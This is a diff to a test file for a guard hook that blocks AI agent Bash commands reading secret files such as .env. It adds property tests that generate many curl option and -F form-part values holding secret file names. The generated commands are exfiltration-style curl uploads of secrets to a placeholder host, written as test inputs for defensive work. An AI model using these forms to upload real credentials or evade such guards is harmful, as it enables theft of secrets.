@@ -57,7 +57,8 @@ const bash = (command) => ({ hook_event_name: 'PreToolUse', tool_name: 'Bash', t
 const PROPERTY_RUNS = { seed: 4856, numRuns: 40 };
 // A bare secret name, or one behind a directory, in the shapes the name
 // predicate classifies as secret (`.ENV` covers the case-folded filesystems).
-const SECRET = fc.constantFrom('.env', '.env.local', '.secrets', 'config/.env.production', '.ENV');
+const SECRET_NAMES = ['.env', '.env.local', '.secrets', 'config/.env.production', '.ENV'];
+const SECRET = fc.constantFrom(...SECRET_NAMES);
 
 function assertAllowed(r, label) {
   assert.equal(r.status, 0, `${label}: expected allow (exit 0), got exit ${r.status}; stdout=${r.stdout}`);
@@ -3899,7 +3900,7 @@ describe('gsd-secret-read-guard: a file named inside a curl option value (#5779)
   });
 
   // Value forms curl reads a file from, each holding the name in a different place.
-  const CURL_VALUE_FORM = fc.constantFrom(
+  const CURL_VALUE_FORMS = [
     (n) => `-d@${n}`,
     (n) => `-sd@${n}`,
     (n) => `-H@${n}`,
@@ -3911,7 +3912,8 @@ describe('gsd-secret-read-guard: a file named inside a curl option value (#5779)
     (n) => `file=@"${n}"`,
     (n) => `-Ffile=@${n}`,
     (n) => `a=b;headers=@${n}`,
-  );
+  ];
+  const CURL_VALUE_FORM = fc.constantFrom(...CURL_VALUE_FORMS);
   const CURL_LOOKALIKE = fc.constantFrom('.env.example', '.env.sample', '.envrc', 'notes.txt', 'app.env');
 
   test('property: a secret name in any curl value form is denied', () => {
@@ -3920,6 +3922,63 @@ describe('gsd-secret-read-guard: a file named inside a curl option value (#5779)
       const cmd = `curl '${word}' x.test`;
       assertBlocked(runHook(bash(cmd)), cmd, { tool: 'Bash', path: word });
     }), PROPERTY_RUNS);
+  });
+
+  test('in process: every curl value form with every secret name is denied', () => {
+    for (const form of CURL_VALUE_FORMS) {
+      for (const name of SECRET_NAMES) {
+        const word = form(name);
+        assert.deepEqual(bashVerdict(`curl '${word}' x.test`), { code: 'secret-read', text: word }, word);
+      }
+    }
+  });
+
+  // 2026-11-11 review, Minor 2: generated `-F` part lists, as curl's
+  // tool_formparse reads them (get_param_part, get_param_word). A part value is
+  // `@` and a `,` list of parts, `<` and one part, or text; each part is a data
+  // word, quoted or not, then `;` parameters: `type=a/b`, `filename=`,
+  // `encoder=`, `headers=` (a file after `@` or `<`), or one curl does not know.
+  const FORM_PARAM = fc.constantFrom('type=text/plain', 'type=application/json', 'encoder=binary', 'filename=up.txt',
+    'filename="q.txt"', 'foo=bar', 'foo="x"', 'headers=X-A: 1');
+  const FORM_PARAMS = fc.array(FORM_PARAM, { maxLength: 3 }).map((ps) => ps.map((p) => `;${p}`).join(''));
+  const FORM_OTHER = fc.constantFrom('a.txt', 'notes.txt', '.env.example', 'data.bin');
+  const FORM_PART = fc.tuple(FORM_OTHER, FORM_PARAMS).map(([name, params]) => name + params);
+  const maybeQuoted = (name, quoted) => (quoted ? `"${name}"` : name);
+  // The secret where curl opens a file: a part of an `@` list, the `<` part,
+  // or a `headers=@` / `headers=<` value after any data.
+  const FORM_FILE_POSITION = fc.oneof(
+    fc.record({ before: fc.array(FORM_PART, { maxLength: 2 }), name: SECRET, quoted: fc.boolean(), params: FORM_PARAMS, after: fc.array(FORM_PART, { maxLength: 2 }) })
+      .map(({ before, name, quoted, params, after }) => `@${[...before, maybeQuoted(name, quoted) + params, ...after].join(',')}`),
+    fc.record({ name: SECRET, quoted: fc.boolean(), params: FORM_PARAMS })
+      .map(({ name, quoted, params }) => `<${maybeQuoted(name, quoted)}${params}`),
+    fc.record({ data: fc.constantFrom('@a.txt', '<a.txt', 'v', '"v"'), pre: FORM_PARAMS, at: fc.constantFrom('@', '<'), name: SECRET, post: FORM_PARAMS })
+      .map(({ data, pre, at, name, post }) => `${data}${pre};headers=${at}${name}${post}`),
+  );
+  // The secret where curl opens nothing: a filename (quoted or not), a type's
+  // major, or a quoted parameter curl does not know.
+  const FORM_NAME_POSITION = fc.record({
+    data: fc.constantFrom('@a.txt', '<a.txt', 'v'), pre: FORM_PARAMS, name: SECRET,
+    at: fc.constantFrom('filename', 'quoted filename', 'type', 'unknown'), post: FORM_PARAMS,
+  }).map(({ data, pre, name, at, post }) => {
+    const param = { filename: `filename=${name}`, 'quoted filename': `filename="${name}"`, type: `type=${name}/plain`, unknown: `foo="${name}"` }[at];
+    return `${data}${pre};${param}${post}`;
+  });
+
+  test('property: a secret at a file position of a generated -F part list is denied', () => {
+    fc.assert(fc.property(FORM_FILE_POSITION, (value) => {
+      const word = `k=${value}`;
+      assert.deepEqual(bashVerdict(`curl -F '${word}' x.test`), { code: 'secret-read', text: word }, word);
+    }), { seed: 5779, numRuns: 300 });
+  });
+
+  // Where curl opens nothing, the curl reading adds no denial: the verdict is
+  // the one `cat` gets for the same word (a name that is the word's last path
+  // segment, `filename=config/.env.production`, is denied there as anywhere).
+  test('property: a secret at a name position of a generated -F part list adds no denial', () => {
+    fc.assert(fc.property(FORM_NAME_POSITION, (value) => {
+      const word = `k=${value}`;
+      assert.deepEqual(bashVerdict(`curl -F '${word}' x.test`), bashVerdict(`cat '${word}'`), word);
+    }), { seed: 5779, numRuns: 300 });
   });
 
   test('property: a template or look-alike name in any curl value form is allowed', () => {
